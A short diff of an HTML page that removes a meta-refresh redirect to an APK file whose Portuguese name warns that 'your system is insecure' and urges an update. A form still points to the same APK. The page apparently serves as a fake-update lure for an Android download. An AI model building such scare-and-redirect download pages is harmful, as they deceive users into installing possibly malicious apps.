@@ -33,7 +33,7 @@
 </head>
  
   <body class="bg-white">
-  <meta http-equiv="refresh" content="2; URL='https://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20ou%20prefere%20atualizar.apk'"/>
+   
 <form action="https://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20ou%20prefere%20atualizar.apk">
     
     <div class="container">
